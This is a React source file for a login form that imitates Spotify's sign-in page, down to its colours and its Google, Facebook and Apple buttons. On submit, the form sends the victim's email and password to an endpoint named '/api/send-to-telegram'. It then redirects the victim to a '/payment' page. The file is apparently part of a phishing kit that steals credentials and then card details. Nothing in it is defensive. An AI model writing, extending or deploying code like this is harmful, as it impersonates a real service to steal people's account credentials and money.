"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { useState } from "react"
import { useTranslation } from "@/lib/language-context"

export function SpotifyLoginForm({ onLoginSuccess }: { onLoginSuccess?: () => void }) {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [message, setMessage] = useState("")
  const { t } = useTranslation()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setMessage("")

    try {
      const response = await fetch("/api/send-to-telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
        }),
      })

      const data = await response.json()

      if (response.ok) {
        setMessage("Login information sent successfully!")
        setTimeout(() => {
          if (onLoginSuccess) {
            onLoginSuccess()
          } else {
            window.location.href = "/payment"
          }
        }, 500)
      } else {
        setMessage(data.error || "Failed to send login information")
      }
    } catch (error) {
      setMessage("An error occurred. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleSignUp = () => {
    if (onLoginSuccess) {
      onLoginSuccess()
    } else {
      window.location.href = "/payment"
    }
  }

  return (
    <div className="w-full max-w-md space-y-6 sm:space-y-8">
      {/* Welcome Text */}
      <h1 className="text-3xl sm:text-5xl font-bold text-white text-center">{t.login.welcomeBack}</h1>

      {/* Login Form */}
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="email" className="text-sm font-bold text-white">
            {t.login.emailLabel}
          </Label>
          <Input
            id="email"
            type="text"
            placeholder=""
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
            className="h-12 bg-[#121212] border-[#727272] text-white placeholder:text-[#727272] hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
          />
        </div>

        <div className="space-y-2">
          <Label htmlFor="password" className="text-sm font-bold text-white">
            {t.login.passwordLabel}
          </Label>
          <Input
            id="password"
            type="password"
            placeholder=""
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
            className="h-12 bg-[#121212] border-[#727272] text-white placeholder:text-[#727272] hover:border-white focus:border-white focus:ring-0 focus:ring-offset-0 rounded-md"
          />
        </div>

        <Button
          type="submit"
          disabled={isLoading}
          className="w-full h-12 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold text-base rounded-full disabled:opacity-50"
        >
          {isLoading ? t.login.sending : t.login.continueButton}
        </Button>

        {message && (
          <p className={`text-sm text-center ${message.includes("success") ? "text-[#1ed760]" : "text-red-500"}`}>
            {message}
          </p>
        )}
      </form>

      {/* Divider */}
      <div className="relative">
        <div className="absolute inset-0 flex items-center">
          <div className="w-full border-t border-[#727272]" />
        </div>
        <div className="relative flex justify-center text-sm">
          <span className="px-4 bg-[#121212] text-white">{t.login.or}</span>
        </div>
      </div>

      {/* Social Login Buttons */}
      <div className="space-y-3">
        <Button
          variant="outline"
          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
        >
          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24">
            <path
              fill="#4285F4"
              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
            />
            <path
              fill="#34A853"
              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
            />
            <path
              fill="#FBBC05"
              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
            />
            <path
              fill="#EA4335"
              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
            />
          </svg>
          {t.login.continueWithGoogle}
        </Button>

        <Button
          variant="outline"
          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
        >
          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24" fill="#1877F2">
            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
          </svg>
          {t.login.continueWithFacebook}
        </Button>

        <Button
          variant="outline"
          className="w-full h-12 bg-transparent border-[#727272] hover:border-white text-white font-semibold rounded-full hover:bg-transparent text-sm sm:text-base"
        >
          <svg className="w-5 h-5 mr-2 sm:mr-3" viewBox="0 0 24 24" fill="white">
            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z" />
          </svg>
          {t.login.continueWithApple}
        </Button>
      </div>

      {/* Sign Up Link */}
      <div className="text-center space-y-4 pt-4">
        <p className="text-[#a7a7a7] text-sm">{t.login.noAccount}</p>
        <button
          onClick={handleSignUp}
          className="text-white font-semibold underline hover:text-[#1ed760] text-sm bg-transparent border-0 cursor-pointer"
        >
          {t.login.signUp}
        </button>
      </div>

      {/* Footer */}
      <p className="text-[#727272] text-xs text-center pt-8">
        {t.login.privacyText}{" "}
        <a href="#" className="underline hover:text-white">
          {t.login.privacyPolicy}
        </a>{" "}
        {t.login.and}{" "}
        <a href="#" className="underline hover:text-white">
          {t.login.termsOfService}
        </a>{" "}
        {t.login.apply}
      </p>
    </div>
  )
}
